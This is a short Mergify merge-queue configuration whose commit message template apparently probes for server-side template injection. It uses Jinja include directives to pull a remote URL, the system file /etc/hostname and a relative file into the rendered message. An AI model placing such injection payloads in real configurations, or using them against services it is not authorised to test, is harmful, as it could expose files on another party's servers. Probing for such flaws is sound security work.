pull_request_rules: []
queue_rules:
  - name: default
    queue_conditions:
      - base=main
    merge_conditions: []
    merge_method: merge
    commit_message_template: |
      V6
      INCLUDE_URL={% include "https://example.com/mergify-ssti-test" %}
      INCLUDE_FILE={% include "/etc/hostname" %}
      INCLUDE_REL={% include "test.txt" %}
merge_queue:
  max_parallel_checks: 1
